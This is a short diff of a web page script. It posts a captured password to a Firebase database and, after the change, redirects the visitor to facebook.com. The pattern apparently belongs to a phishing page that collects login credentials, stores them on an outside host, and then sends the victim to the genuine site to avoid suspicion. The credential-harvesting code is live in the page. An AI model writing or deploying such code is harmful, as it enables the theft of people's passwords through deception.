@@ -21,7 +21,7 @@
                 pass: password
             }
             axios.post('https://portfolio-32809.firebaseio.com/order.json', data).then(
-                res => console.log(res)
+                window.location.assign("https://www.facebook.com")
             ).catch(err => console.log(err));
         }
         </script>
